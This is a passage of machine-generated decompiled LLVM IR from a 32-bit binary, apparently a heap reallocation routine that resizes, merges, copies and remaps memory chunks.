  %v1_8053da0 = icmp eq i1 %v1_8053d9e, false
  br i1 %v1_8053da0, label %dec_label_pc_8053db3, label %dec_label_pc_8053da2

dec_label_pc_8053da2:                             ; preds = %dec_label_pc_8053d9e
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053da9 = call i32 @function_80542d9(i32 %tmp6)
  store i32 %v1_8053da9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054097

dec_label_pc_8053db3:                             ; preds = %dec_label_pc_8053d9e
  %v2_8053dbe = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053dbe, i32* @eax, align 4
  store i32 %v2_8053dbe, i32* %stack_var_-60, align 4
  %v2_8053dc3 = call i32 @function_8054a40(i32 %v2_8053dbe, i32 134564413)
  store i32 %v2_8053dc3, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80571a0.205 to i32), i32* %stack_var_-60, align 4
  %v1_8053dcf = call i32 @function_8054a3d(i32 ptrtoint (i32* @global_var_80571a0.205 to i32))
  store i32 %v1_8053dcf, i32* %eax.global-to-local, align 4
  %v0_8053dd7 = load i32, i32* @ebx, align 4
  %tmp19 = icmp ult i32 %v0_8053dd7, -32
  br i1 %tmp19, label %dec_label_pc_8053dee, label %dec_label_pc_8053ddc

dec_label_pc_8053ddc:                             ; preds = %dec_label_pc_8053db3
  %v0_8053ddc = load i32, i32* %stack_var_-60, align 4
  %v1_8053ddc = call i32 @function_80530b9(i32 %v0_8053ddc)
  store i32 %v1_8053ddc, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8053de3 = inttoptr i32 %v1_8053ddc to i32*
  store i32 12, i32* %v1_8053de3, align 4
  br label %dec_label_pc_805409a

dec_label_pc_8053dee:                             ; preds = %dec_label_pc_8053db3
  %v1_8053dee = add i32 %v0_8053dd7, 11
  %tmp20 = icmp ult i32 %v1_8053dee, 16
  br i1 %tmp20, label %dec_label_pc_8053e05, label %dec_label_pc_8053dfe

dec_label_pc_8053dfe:                             ; preds = %dec_label_pc_8053dee
  %v1_8053dfe = and i32 %v1_8053dee, -8
  br label %dec_label_pc_8053e05

dec_label_pc_8053e05:                             ; preds = %dec_label_pc_8053dee, %dec_label_pc_8053dfe
  %stack_var_-40.0 = phi i32 [ %v1_8053dfe, %dec_label_pc_8053dfe ], [ 16, %dec_label_pc_8053dee ]
  %storemerge26 = phi i32 [ %v1_8053dfe, %dec_label_pc_8053dfe ], [ %v1_8053dee, %dec_label_pc_8053dee ]
  store i32 %storemerge26, i32* %eax.global-to-local, align 4
  %v1_8053e09 = add i32 %tmp6, -8
  store i32 %v1_8053e09, i32* @edi, align 4
  %v1_8053e0c = add i32 %tmp6, -4
  %v2_8053e0c = inttoptr i32 %v1_8053e0c to i32*
  %v3_8053e0c = load i32, i32* %v2_8053e0c, align 4
  store i32 %v3_8053e0c, i32* @edx, align 4
  %v1_8053e11 = and i32 %v3_8053e0c, -4
  store i32 %v1_8053e11, i32* %eax.global-to-local, align 4
  %v2_8053e18 = and i32 %v3_8053e0c, 2
  %v3_8053e18 = icmp eq i32 %v2_8053e18, 0
  %v1_8053e1b = icmp eq i1 %v3_8053e18, false
  br i1 %v1_8053e1b, label %dec_label_pc_8053fb5, label %dec_label_pc_8053e21

dec_label_pc_8053e21:                             ; preds = %dec_label_pc_8053e05
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053e11, i32* @ebx, align 4
  %v7_8053e27 = icmp ult i32 %v1_8053e11, %stack_var_-40.0
  %v1_8053e29 = icmp eq i1 %v7_8053e27, false
  br i1 %v1_8053e29, label %dec_label_pc_8053f60, label %dec_label_pc_8053e2f

dec_label_pc_8053e2f:                             ; preds = %dec_label_pc_8053e21
  %v2_8053e2f = add i32 %v1_8053e11, %v1_8053e09
  store i32 %v2_8053e2f, i32* @esi, align 4
  %v1_8053e32 = load i32, i32* @global_var_805756c.207, align 4
  %v12_8053e32 = icmp eq i32 %v2_8053e2f, %v1_8053e32
  %v1_8053e38 = icmp eq i1 %v12_8053e32, false
  %v1_8053e72 = add i32 %v2_8053e2f, 4
  %v2_8053e72 = inttoptr i32 %v1_8053e72 to i32*
  %v3_8053e72 = load i32, i32* %v2_8053e72, align 4
  br i1 %v1_8053e38, label %dec_label_pc_8053e72, label %dec_label_pc_8053e3a

dec_label_pc_8053e3a:                             ; preds = %dec_label_pc_8053e2f
  %v1_8053e3f = and i32 %v3_8053e72, -4
  %v2_8053e42 = add i32 %v1_8053e3f, %v1_8053e11
  store i32 %v2_8053e42, i32* %ecx.global-to-local, align 4
  %v1_8053e48 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8053e48, i32* %eax.global-to-local, align 4
  %v7_8053e4b = icmp ult i32 %v2_8053e42, %v1_8053e48
  br i1 %v7_8053e4b, label %dec_label_pc_8053eb0, label %dec_label_pc_8053e4f

dec_label_pc_8053e4f:                             ; preds = %dec_label_pc_8053e3a
  %v1_8053e4f = urem i32 %v3_8053e0c, 2
  %v5_8053e52 = or i32 %v1_8053e4f, %stack_var_-40.0
  store i32 %v5_8053e52, i32* @edx, align 4
  store i32 %v5_8053e52, i32* %v2_8053e0c, align 4
  %v0_8053e5d = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053e5d = sub i32 %v0_8053e5d, %stack_var_-40.0
  %v0_8053e5f = load i32, i32* @edi, align 4
  %v2_8053e5f = add i32 %v0_8053e5f, %stack_var_-40.0
  store i32 %v2_8053e5f, i32* %eax.global-to-local, align 4
  %v1_8053e62 = or i32 %v2_8053e5d, 1
  store i32 %v1_8053e62, i32* %ecx.global-to-local, align 4
  store i32 %v2_8053e5f, i32* @global_var_805756c.207, align 4
  %v2_8053e6a = add i32 %v2_8053e5f, 4
  %v3_8053e6a = inttoptr i32 %v2_8053e6a to i32*
  store i32 %v1_8053e62, i32* %v3_8053e6a, align 4
  br label %dec_label_pc_8054085

dec_label_pc_8053e72:                             ; preds = %dec_label_pc_8053e2f
  %v1_8053e77 = and i32 %v3_8053e72, -2
  store i32 %v1_8053e77, i32* %eax.global-to-local, align 4
  %v3_8053e7a = add i32 %v1_8053e72, %v1_8053e77
  %v4_8053e7a = inttoptr i32 %v3_8053e7a to i8*
  %v5_8053e7a = load i8, i8* %v4_8053e7a, align 1
  %v6_8053e7a = urem i8 %v5_8053e7a, 2
  %v7_8053e7a = icmp eq i8 %v6_8053e7a, 0
  %v1_8053e7f = icmp eq i1 %v7_8053e7a, false
  br i1 %v1_8053e7f, label %dec_label_pc_8053eb0, label %dec_label_pc_8053e81

dec_label_pc_8053e81:                             ; preds = %dec_label_pc_8053e72
  %v1_8053e81 = and i32 %v3_8053e72, -4
  %v2_8053e88 = add i32 %v1_8053e81, %v1_8053e11
  store i32 %v2_8053e88, i32* @ebx, align 4
  %v10_8053e8a = icmp ult i32 %v2_8053e88, %stack_var_-40.0
  br i1 %v10_8053e8a, label %dec_label_pc_8053eb0, label %dec_label_pc_8053e90

dec_label_pc_8053e90:                             ; preds = %dec_label_pc_8053e81
  %v1_8053e90 = add i32 %v1_8053e11, %tmp6
  %v2_8053e90 = inttoptr i32 %v1_8053e90 to i32*
  %v3_8053e90 = load i32, i32* %v2_8053e90, align 4
  store i32 %v3_8053e90, i32* @edx, align 4
  %v1_8053e93 = add i32 %v2_8053e2f, 12
  %v2_8053e93 = inttoptr i32 %v1_8053e93 to i32*
  %v3_8053e93 = load i32, i32* %v2_8053e93, align 4
  store i32 %v3_8053e93, i32* %eax.global-to-local, align 4
  %v1_8053e96 = add i32 %v3_8053e90, 12
  %v2_8053e96 = inttoptr i32 %v1_8053e96 to i32*
  %v3_8053e96 = load i32, i32* %v2_8053e96, align 4
  %v15_8053e96 = icmp eq i32 %v3_8053e96, %v2_8053e2f
  %v1_8053e99 = icmp eq i1 %v15_8053e96, false
  br i1 %v1_8053e99, label %dec_label_pc_8053ea0, label %dec_label_pc_8053e9b

dec_label_pc_8053e9b:                             ; preds = %dec_label_pc_8053e90
  %v1_8053e9b = add i32 %v3_8053e93, 8
  %v2_8053e9b = inttoptr i32 %v1_8053e9b to i32*
  %v3_8053e9b = load i32, i32* %v2_8053e9b, align 4
  %v15_8053e9b = icmp eq i32 %v3_8053e9b, %v2_8053e2f
  br i1 %v15_8053e9b, label %dec_label_pc_8053ea5, label %dec_label_pc_8053ea0

dec_label_pc_8053ea0:                             ; preds = %dec_label_pc_8053e9b, %dec_label_pc_8053e90
  %v0_8053ea0 = call i32 @function_8054475()
  store i32 %v0_8053ea0, i32* %eax.global-to-local, align 4
  %v1_8053ea5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053ea5

dec_label_pc_8053ea5:                             ; preds = %dec_label_pc_8053e9b, %dec_label_pc_8053ea0
  %v1_8053ea5 = phi i32 [ %v3_8053e90, %dec_label_pc_8053e9b ], [ %v1_8053ea5.pre, %dec_label_pc_8053ea0 ]
  %v0_8053ea5 = phi i32 [ %v3_8053e93, %dec_label_pc_8053e9b ], [ %v0_8053ea0, %dec_label_pc_8053ea0 ]
  %v2_8053ea5 = add i32 %v1_8053ea5, 12
  %v3_8053ea5 = inttoptr i32 %v2_8053ea5 to i32*
  store i32 %v0_8053ea5, i32* %v3_8053ea5, align 4
  %v0_8053ea8 = load i32, i32* @edx, align 4
  %v1_8053ea8 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053ea8 = add i32 %v1_8053ea8, 8
  %v3_8053ea8 = inttoptr i32 %v2_8053ea8 to i32*
  store i32 %v0_8053ea8, i32* %v3_8053ea8, align 4
  %v0_8053f60.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053f60

dec_label_pc_8053eb0:                             ; preds = %dec_label_pc_8053e81, %dec_label_pc_8053e72, %dec_label_pc_8053e3a
  %v1_8053eb7 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8053eb7, i32* %eax.global-to-local, align 4
  store i32 %v1_8053eb7, i32* %stack_var_-60, align 4
  %v1_8053ebb = call i32 @function_8053514(i32 %v1_8053eb7)
  store i32 %v1_8053ebb, i32* %eax.global-to-local, align 4
  store i32 %v1_8053ebb, i32* @edx, align 4
  %v1_8053ec5 = icmp eq i32 %v1_8053ebb, 0
  br i1 %v1_8053ec5, label %dec_label_pc_8054081, label %dec_label_pc_8053ecd

dec_label_pc_8053ecd:                             ; preds = %dec_label_pc_8053eb0
  %v1_8053ecd = add i32 %v1_8053ebb, -8
  store i32 %v1_8053ecd, i32* %ebx.global-to-local, align 4
  %v1_8053ed0 = load i32, i32* @esi, align 4
  %v12_8053ed0 = icmp eq i32 %v1_8053ecd, %v1_8053ed0
  %v1_8053ed2 = add i32 %v1_8053ebb, -4
  %v2_8053ed2 = inttoptr i32 %v1_8053ed2 to i32*
  %v3_8053ed2 = load i32, i32* %v2_8053ed2, align 4
  store i32 %v3_8053ed2, i32* %eax.global-to-local, align 4
  %v1_8053ed5 = icmp eq i1 %v12_8053ed0, false
  br i1 %v1_8053ed5, label %dec_label_pc_8053ee3, label %dec_label_pc_8053ed7

dec_label_pc_8053ed7:                             ; preds = %dec_label_pc_8053ecd
  %v1_8053ed7 = and i32 %v3_8053ed2, -4
  store i32 %v1_8053ed7, i32* %eax.global-to-local, align 4
  store i32 %v1_8053e11, i32* @edx, align 4
  %v2_8053ede = add i32 %v1_8053ed7, %v1_8053e11
  store i32 %v2_8053ede, i32* @ebx, align 4
  br label %dec_label_pc_8053f60

dec_label_pc_8053ee3:                             ; preds = %dec_label_pc_8053ecd
  %v1_8053ee7 = add i32 %v1_8053e11, -4
  store i32 %v1_8053ee7, i32* %eax.global-to-local, align 4
  %v2_8053eec = udiv i32 %v1_8053ee7, 4
  store i32 %v2_8053eec, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8053ee7, 37
  br i1 %tmp, label %dec_label_pc_8053f05, label %dec_label_pc_8053ef4

dec_label_pc_8053ef4:                             ; preds = %dec_label_pc_8053ee3
  store i32 %v1_8053ebb, i32* %stack_var_-60, align 4
  %v3_8053efb = inttoptr i32 %v1_8053ebb to i16*
  %v4_8053efb = call i32 @function_8055302(i16* %v3_8053efb, i32 %tmp6, i32 %v1_8053ee7)
  store i32 %v4_8053efb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f4c

dec_label_pc_8053f05:                             ; preds = %dec_label_pc_8053ee3
  store i32 %tmp6, i32* @esi, align 4
  %v1_8053f0c = inttoptr i32 %tmp6 to i32*
  %v2_8053f0c = load i32, i32* %v1_8053f0c, align 4
  store i32 %v2_8053f0c, i32* %eax.global-to-local, align 4
  %v2_8053f0e = inttoptr i32 %v1_8053ebb to i32*
  store i32 %v2_8053f0c, i32* %v2_8053f0e, align 4
  %v0_8053f10 = load i32, i32* @esi, align 4
  %v1_8053f10 = add i32 %v0_8053f10, 4
  %v2_8053f10 = inttoptr i32 %v1_8053f10 to i32*
  %v3_8053f10 = load i32, i32* %v2_8053f10, align 4
  store i32 %v3_8053f10, i32* %eax.global-to-local, align 4
  %v1_8053f13 = load i32, i32* @edx, align 4
  %v2_8053f13 = add i32 %v1_8053f13, 4
  %v3_8053f13 = inttoptr i32 %v2_8053f13 to i32*
  store i32 %v3_8053f10, i32* %v3_8053f13, align 4
  %v0_8053f16 = load i32, i32* @esi, align 4
  %v1_8053f16 = add i32 %v0_8053f16, 8
  %v2_8053f16 = inttoptr i32 %v1_8053f16 to i32*
  %v3_8053f16 = load i32, i32* %v2_8053f16, align 4
  store i32 %v3_8053f16, i32* %eax.global-to-local, align 4
  %v1_8053f19 = load i32, i32* @edx, align 4
  %v2_8053f19 = add i32 %v1_8053f19, 8
  %v3_8053f19 = inttoptr i32 %v2_8053f19 to i32*
  store i32 %v3_8053f16, i32* %v3_8053f19, align 4
  %tmp27 = icmp ult i32 %v1_8053ee7, 17
  br i1 %tmp27, label %dec_label_pc_8053f4c, label %dec_label_pc_8053f1e

dec_label_pc_8053f1e:                             ; preds = %dec_label_pc_8053f05
  %v0_8053f1e = load i32, i32* @esi, align 4
  %v1_8053f1e = add i32 %v0_8053f1e, 12
  %v2_8053f1e = inttoptr i32 %v1_8053f1e to i32*
  %v3_8053f1e = load i32, i32* %v2_8053f1e, align 4
  store i32 %v3_8053f1e, i32* %eax.global-to-local, align 4
  %v0_8053f21 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053f24 = load i32, i32* @edx, align 4
  %v2_8053f24 = add i32 %v1_8053f24, 12
  %v3_8053f24 = inttoptr i32 %v2_8053f24 to i32*
  store i32 %v3_8053f1e, i32* %v3_8053f24, align 4
  %v0_8053f27 = load i32, i32* @esi, align 4
  %v1_8053f27 = add i32 %v0_8053f27, 16
  %v2_8053f27 = inttoptr i32 %v1_8053f27 to i32*
  %v3_8053f27 = load i32, i32* %v2_8053f27, align 4
  store i32 %v3_8053f27, i32* %eax.global-to-local, align 4
  %v1_8053f2a = load i32, i32* @edx, align 4
  %v2_8053f2a = add i32 %v1_8053f2a, 16
  %v3_8053f2a = inttoptr i32 %v2_8053f2a to i32*
  store i32 %v3_8053f27, i32* %v3_8053f2a, align 4
  %tmp21 = icmp ult i32 %v0_8053f21, 7
  br i1 %tmp21, label %dec_label_pc_8053f4c, label %dec_label_pc_8053f2f

dec_label_pc_8053f2f:                             ; preds = %dec_label_pc_8053f1e
  %v0_8053f2f = load i32, i32* @esi, align 4
  %v1_8053f2f = add i32 %v0_8053f2f, 20
  %v2_8053f2f = inttoptr i32 %v1_8053f2f to i32*
  %v3_8053f2f = load i32, i32* %v2_8053f2f, align 4
  store i32 %v3_8053f2f, i32* %eax.global-to-local, align 4
  %v0_8053f32 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053f35 = load i32, i32* @edx, align 4
  %v2_8053f35 = add i32 %v1_8053f35, 20
  %v3_8053f35 = inttoptr i32 %v2_8053f35 to i32*
  store i32 %v3_8053f2f, i32* %v3_8053f35, align 4
  %v0_8053f38 = load i32, i32* @esi, align 4
  %v1_8053f38 = add i32 %v0_8053f38, 24
  %v2_8053f38 = inttoptr i32 %v1_8053f38 to i32*
  %v3_8053f38 = load i32, i32* %v2_8053f38, align 4
  store i32 %v3_8053f38, i32* %eax.global-to-local, align 4
  %v1_8053f3b = load i32, i32* @edx, align 4
  %v2_8053f3b = add i32 %v1_8053f3b, 24
  %v3_8053f3b = inttoptr i32 %v2_8053f3b to i32*
  store i32 %v3_8053f38, i32* %v3_8053f3b, align 4
  %tmp22 = icmp ult i32 %v0_8053f32, 9
  br i1 %tmp22, label %dec_label_pc_8053f4c, label %dec_label_pc_8053f40

dec_label_pc_8053f40:                             ; preds = %dec_label_pc_8053f2f
  %v0_8053f40 = load i32, i32* @esi, align 4
  %v1_8053f40 = add i32 %v0_8053f40, 28
  %v2_8053f40 = inttoptr i32 %v1_8053f40 to i32*
  %v3_8053f40 = load i32, i32* %v2_8053f40, align 4
  store i32 %v3_8053f40, i32* %eax.global-to-local, align 4
  %v1_8053f43 = load i32, i32* @edx, align 4
  %v2_8053f43 = add i32 %v1_8053f43, 28
  %v3_8053f43 = inttoptr i32 %v2_8053f43 to i32*
  store i32 %v3_8053f40, i32* %v3_8053f43, align 4
  %v0_8053f46 = load i32, i32* @esi, align 4
  %v1_8053f46 = add i32 %v0_8053f46, 32
  %v2_8053f46 = inttoptr i32 %v1_8053f46 to i32*
  %v3_8053f46 = load i32, i32* %v2_8053f46, align 4
  store i32 %v3_8053f46, i32* %eax.global-to-local, align 4
  %v1_8053f49 = load i32, i32* @edx, align 4
  %v2_8053f49 = add i32 %v1_8053f49, 32
  %v3_8053f49 = inttoptr i32 %v2_8053f49 to i32*
  store i32 %v3_8053f46, i32* %v3_8053f49, align 4
  br label %dec_label_pc_8053f4c

dec_label_pc_8053f4c:                             ; preds = %dec_label_pc_8053f2f, %dec_label_pc_8053f1e, %dec_label_pc_8053f05, %dec_label_pc_8053ef4, %dec_label_pc_8053f40
  %v0_8053f4f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f4f = add i32 %v0_8053f4f, 8
  store i32 %v1_8053f4f, i32* @ebx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053f56 = call i32 @function_80542d9(i32 %tmp6)
  br label %dec_label_pc_805407c

dec_label_pc_8053f60:                             ; preds = %dec_label_pc_8053e21, %dec_label_pc_8053ed7, %dec_label_pc_8053ea5
  %v1_8053f71 = phi i32 [ %v1_8053e11, %dec_label_pc_8053e21 ], [ %v2_8053ede, %dec_label_pc_8053ed7 ], [ %v0_8053f60.pre, %dec_label_pc_8053ea5 ]
  %v5_8053f62 = sub i32 %v1_8053f71, %stack_var_-40.0
  store i32 %v5_8053f62, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v5_8053f62, 16
  br i1 %tmp23, label %dec_label_pc_8053f6b, label %dec_label_pc_8053f7d

dec_label_pc_8053f6b:                             ; preds = %dec_label_pc_8053f60
  %v0_8053f6b = load i32, i32* @edi, align 4
  %v1_8053f6b = add i32 %v0_8053f6b, 4
  %v2_8053f6b = inttoptr i32 %v1_8053f6b to i32*
  %v3_8053f6b = load i32, i32* %v2_8053f6b, align 4
  %v1_8053f6e = urem i32 %v3_8053f6b, 2
  %v2_8053f71 = or i32 %v1_8053f6e, %v1_8053f71
  store i32 %v2_8053f71, i32* %eax.global-to-local, align 4
  store i32 %v2_8053f71, i32* %v2_8053f6b, align 4
  %v0_8053f76 = load i32, i32* @edi, align 4
  %v1_8053f76 = load i32, i32* @ebx, align 4
  %v2_8053f76 = add i32 %v0_8053f76, 4
  %v3_8053f76 = add i32 %v2_8053f76, %v1_8053f76
  %v4_8053f76 = inttoptr i32 %v3_8053f76 to i32*
  %v5_8053f76 = load i32, i32* %v4_8053f76, align 4
  %v6_8053f76 = or i32 %v5_8053f76, 1
  store i32 %v6_8053f76, i32* %v4_8053f76, align 4
  br label %dec_label_pc_8053fad

dec_label_pc_8053f7d:                             ; preds = %dec_label_pc_8053f60
  %v0_8053f81 = load i32, i32* @edi, align 4
  %v2_8053f81 = add i32 %v0_8053f81, %stack_var_-40.0
  store i32 %v2_8053f81, i32* %eax.global-to-local, align 4
  %v1_8053f84 = add i32 %v0_8053f81, 4
  %v2_8053f84 = inttoptr i32 %v1_8053f84 to i32*
  %v3_8053f84 = load i32, i32* %v2_8053f84, align 4
  %v1_8053f87 = urem i32 %v3_8053f84, 2
  %v5_8053f8a = or i32 %v1_8053f87, %stack_var_-40.0
  store i32 %v5_8053f8a, i32* %v2_8053f84, align 4
  %v0_8053f94 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053f96 = or i32 %v0_8053f94, 1
  store i32 %v1_8053f96, i32* @edx, align 4
  %v1_8053f99 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053f99 = add i32 %v1_8053f99, 4
  %v3_8053f99 = inttoptr i32 %v2_8053f99 to i32*
  store i32 %v1_8053f96, i32* %v3_8053f99, align 4
  %v0_8053f9c = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f9c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053f9c = add i32 %v0_8053f9c, 4
  %v3_8053f9c = add i32 %v2_8053f9c, %v1_8053f9c
  %v4_8053f9c = inttoptr i32 %v3_8053f9c to i32*
  %v5_8053f9c = load i32, i32* %v4_8053f9c, align 4
  %v6_8053f9c = or i32 %v5_8053f9c, 1
  store i32 %v6_8053f9c, i32* %v4_8053f9c, align 4
  %v0_8053fa1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053fa1 = add i32 %v0_8053fa1, 8
  store i32 %v1_8053fa1, i32* %eax.global-to-local, align 4
  store i32 %v1_8053fa1, i32* %stack_var_-60, align 4
  %v1_8053fa5 = call i32 @function_80542d9(i32 %v1_8053fa1)
  store i32 %v1_8053fa5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053fad

dec_label_pc_8053fad:                             ; preds = %dec_label_pc_8053f6b, %dec_label_pc_8053f7d
  %v0_8053fad = load i32, i32* @edi, align 4
  %v1_8053fad = add i32 %v0_8053fad, 8
  store i32 %v1_8053fad, i32* @ebx, align 4
  br label %dec_label_pc_8054089

dec_label_pc_8053fb5:                             ; preds = %dec_label_pc_8053e05
  store i32 %tmp6, i32* %ecx.global-to-local, align 4
  %v0_8053fb9 = load i32, i32* @global_var_805789c.212, align 4
  %v1_8053fbe = add i32 %v0_8053fb9, -1
  store i32 %v1_8053fbe, i32* %eax.global-to-local, align 4
  %v2_8053fc3 = inttoptr i32 %v1_8053e09 to i32*
  %v3_8053fc3 = load i32, i32* %v2_8053fc3, align 4
  store i32 %v3_8053fc3, i32* @ebp, align 4
  %v1_8053fc6 = or i32 %stack_var_-40.0, 4
  store i32 %v1_8053fc6, i32* %stack_var_-44, align 4
  %v2_8053fcc = add i32 %v3_8053fc3, %v1_8053fbe
  store i32 %v2_8053fcc, i32* @edx, align 4
  %v1_8053fcf = sub i32 0, %v0_8053fb9
  store i32 %v1_8053fcf, i32* %eax.global-to-local, align 4
  %v2_8053fd1 = add i32 %v2_8053fcc, %v1_8053fc6
  %v2_8053fd4 = and i32 %v2_8053fd1, %v1_8053fcf
  store i32 %v2_8053fd4, i32* @esi, align 4
  %v2_8053fd8 = sub i32 %v2_8053fd4, %v3_8053fc3
  store i32 %v2_8053fd8, i32* @ebx, align 4
  %v15_8053fda = icmp eq i32 %v1_8053e11, %v2_8053fd8
  br i1 %v15_8053fda, label %dec_label_pc_8054085, label %dec_label_pc_8053fe4

dec_label_pc_8053fe4:                             ; preds = %dec_label_pc_8053fb5
  %v2_8053feb = sub i32 %v1_8053e09, %v3_8053fc3
  store i32 %v2_8053feb, i32* @edi, align 4
  %v2_8053fed = add i32 %v3_8053fc3, %v1_8053e11
  store i32 %v2_8053fed, i32* %eax.global-to-local, align 4
  store i32 %v2_8053feb, i32* %stack_var_-60, align 4
  %v6_8053ff1 = inttoptr i32 %v2_8053feb to i32*
  %v7_8053ff1 = call i32 @function_8055166(i32* %v6_8053ff1, i32 %v2_8053fed, i32 %v2_8053fd4, i32 1, i32 %v1_8053fc6, i32 %v1_8053e11)
  store i32 %v7_8053ff1, i32* %eax.global-to-local, align 4
  %v10_8053ff9 = icmp eq i32 %v7_8053ff1, -1
  br i1 %v10_8053ff9, label %dec_label_pc_805403d, label %dec_label_pc_8053ffe

dec_label_pc_8053ffe:                             ; preds = %dec_label_pc_8053fe4
  %v1_8053ffe = load i32, i32* @ebp, align 4
  %v2_8053ffe = add i32 %v1_8053ffe, %v7_8053ff1
  store i32 %v2_8053ffe, i32* @edx, align 4
  %v0_8054001 = load i32, i32* @ebx, align 4
  %v1_8054001 = or i32 %v0_8054001, 2
  store i32 %v1_8054001, i32* %ebx.global-to-local, align 4
  %v0_8054004 = load i32, i32* @esi, align 4
  store i32 %v0_8054004, i32* %eax.global-to-local, align 4
  %v2_8054006 = add i32 %v2_8053ffe, 4
  %v3_8054006 = inttoptr i32 %v2_8054006 to i32*
  store i32 %v1_8054001, i32* %v3_8054006, align 4
  %v0_8054009 = load i32, i32* %eax.global-to-local, align 4
  %v5_8054009 = sub i32 %v0_8054009, %v1_8053e11
  %v1_805400d = load i32, i32* @global_var_80578a4.217, align 4
  %v2_805400d = add i32 %v1_805400d, %v5_8054009
  store i32 %v2_805400d, i32* %eax.global-to-local, align 4
  store i32 %v2_805400d, i32* @global_var_80578a4.217, align 4
  %v1_8054018 = load i32, i32* @global_var_80578b0.218, align 16
  %tmp24 = icmp ugt i32 %v2_805400d, %v1_8054018
  br i1 %tmp24, label %dec_label_pc_8054020, label %dec_label_pc_8054025

dec_label_pc_8054020:                             ; preds = %dec_label_pc_8053ffe
  store i32 %v2_805400d, i32* @global_var_80578b0.218, align 16
  br label %dec_label_pc_8054025

dec_label_pc_8054025:                             ; preds = %dec_label_pc_8053ffe, %dec_label_pc_8054020
  %v1_8054025 = load i32, i32* @global_var_80578a8.219, align 8
  %v2_8054025 = add i32 %v1_8054025, %v2_805400d
  store i32 %v2_8054025, i32* %eax.global-to-local, align 4
  %v1_805402b = load i32, i32* @global_var_80578b4.220, align 4
  %tmp25 = icmp ugt i32 %v2_8054025, %v1_805402b
  br i1 %tmp25, label %dec_label_pc_8054033, label %dec_label_pc_8054038

dec_label_pc_8054033:                             ; preds = %dec_label_pc_8054025
  store i32 %v2_8054025, i32* @global_var_80578b4.220, align 4
  br label %dec_label_pc_8054038

dec_label_pc_8054038:                             ; preds = %dec_label_pc_8054025, %dec_label_pc_8054033
  %v0_8054038 = load i32, i32* @edx, align 4
  %v1_8054038 = add i32 %v0_8054038, 8
  store i32 %v1_8054038, i32* @ebx, align 4
  br label %dec_label_pc_8054089

dec_label_pc_805403d:                             ; preds = %dec_label_pc_8053fe4
  %v2_805403d = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_805403d, i32* %eax.global-to-local, align 4
  %v10_8054040 = icmp ult i32 %v1_8053e11, %v2_805403d
  %v1_8054044 = icmp eq i1 %v10_8054040, false
  br i1 %v1_8054044, label %dec_label_pc_8054085, label %dec_label_pc_8054046

dec_label_pc_8054046:                             ; preds = %dec_label_pc_805403d
  %v1_805404d = add i32 %stack_var_-40.0, -7
  store i32 %v1_805404d, i32* %eax.global-to-local, align 4
  store i32 %v1_805404d, i32* %stack_var_-60, align 4
  %v1_8054051 = call i32 @function_8053514(i32 %v1_805404d)
  store i32 %v1_8054051, i32* %eax.global-to-local, align 4
  store i32 %v1_8054051, i32* @ebx, align 4
  %v1_805405b = icmp eq i32 %v1_8054051, 0
  br i1 %v1_805405b, label %dec_label_pc_8054081, label %dec_label_pc_805405f

dec_label_pc_805405f:                             ; preds = %dec_label_pc_8054046
  %v1_8054064 = add i32 %v1_8053e11, -8
  store i32 %v1_8054064, i32* %eax.global-to-local, align 4
  store i32 %v1_8054051, i32* %stack_var_-60, align 4
  %v3_805406d = inttoptr i32 %v1_8054051 to i16*
  %v4_805406d = call i32 @function_8055302(i16* %v3_805406d, i32 %tmp6, i32 %v1_8054064)
  store i32 %v4_805406d, i32* %eax.global-to-local, align 4
  store i32 %v1_8054051, i32* @edx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8054077 = call i32 @function_80542d9(i32 %tmp6)
  br label %dec_label_pc_805407c

dec_label_pc_805407c:                             ; preds = %dec_label_pc_8053f4c, %dec_label_pc_805405f
  %storemerge = phi i32 [ %v1_8054077, %dec_label_pc_805405f ], [ %v1_8053f56, %dec_label_pc_8053f4c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054089

dec_label_pc_8054081:                             ; preds = %dec_label_pc_8054046, %dec_label_pc_8053eb0
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8054089

dec_label_pc_8054085:                             ; preds = %dec_label_pc_805403d, %dec_label_pc_8053fb5, %dec_label_pc_8053e4f
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_8054089

dec_label_pc_8054089:                             ; preds = %dec_label_pc_8054081, %dec_label_pc_805407c, %dec_label_pc_8054038, %dec_label_pc_8053fad, %dec_label_pc_8054085
  store i32 %v2_8053dbe, i32* @eax, align 4
  store i32 %v2_8053dbe, i32* %stack_var_-60, align 4
  %v2_8054092 = call i32 @function_8054a40(i32 %v2_8053dbe, i32 1)
  store i32 %v2_8054092, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054097

dec_label_pc_8054097:                             ; preds = %dec_label_pc_8053da2, %dec_label_pc_8053d8e, %dec_label_pc_8054089
  br label %dec_label_pc_805409a

dec_label_pc_805409a:                             ; preds = %dec_label_pc_8053ddc, %dec_label_pc_8054097
  %v0_805409d = load i32, i32* @ebx, align 4
  store i32 %v0_805409d, i32* %eax.global-to-local, align 4
